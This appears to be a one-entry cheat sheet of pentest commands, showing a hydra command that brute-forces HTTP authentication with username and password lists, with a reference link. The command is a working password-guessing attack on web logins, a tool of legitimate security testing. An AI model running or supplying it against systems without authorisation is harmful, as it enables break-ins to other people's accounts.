### 1. Brute HTTP with hydra -s 443 for ssl
```
hydra -L [usernames] -P [passwords] -t 1 -e ns -f -vV <destination> http-get /
```
**- linux,brute,http**
#### References:

https://www.aldeid.com/wiki/Thc-hydra#Usage
__________
